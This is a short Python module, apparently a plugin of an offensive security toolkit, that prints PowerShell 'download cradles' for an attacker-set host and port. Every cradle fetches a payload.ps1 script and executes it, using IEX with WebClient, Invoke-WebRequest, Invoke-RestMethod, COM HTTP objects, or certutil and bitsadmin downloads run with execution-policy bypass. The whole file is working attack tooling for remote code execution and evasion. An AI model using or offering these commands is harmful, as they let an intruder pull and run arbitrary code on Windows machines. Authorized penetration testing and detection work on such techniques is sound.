"""PowerShell download cradles  -  IEX, WebClient, COM objects, certutil pipe."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.evasion.ps_cradle.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["file_download", "code_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1059.001"],
}


def run(args: Any) -> int:
    lhost = getattr(args, "lhost", None) or getattr(args, "target", None) or "LHOST"
    lport = getattr(args, "lport", "8080") if hasattr(args, "lport") else "8080"
    url = f"http://{lhost}:{lport}/payload.ps1"

    print("[*] PowerShell Download Cradles")

    cradles = {
        "iex_webclient": f"IEX(New-Object Net.WebClient).DownloadString('{url}')",
        "iex_iwr": f"IEX(IWR -Uri '{url}' -UseBasicParsing).Content",
        "iex_restmethod": f"IEX(Invoke-RestMethod '{url}')",
        "com_xmlhttp": f"$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','{url}',0);$h.send();IEX $h.responseText",
        "com_winhttprequest": f"$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$h.open('GET','{url}',0);$h.send();IEX $h.responseText",
        "certutil_pipe": f"certutil -urlcache -split -f {url} C:\\Windows\\Temp\\p.ps1 && powershell -ep bypass C:\\Windows\\Temp\\p.ps1",
        "bitsadmin_pipe": f"bitsadmin /transfer j http://{lhost}:{lport}/p.ps1 C:\\Windows\\Temp\\p.ps1 && powershell -ep bypass C:\\Windows\\Temp\\p.ps1",
        "base64_encoded": "powershell -enc <BASE64_OF_SCRIPT>",
    }

    for name, cradle in cradles.items():
        print(f"\n  [{name}]")
        print(f"  {cradle}")

    return 0
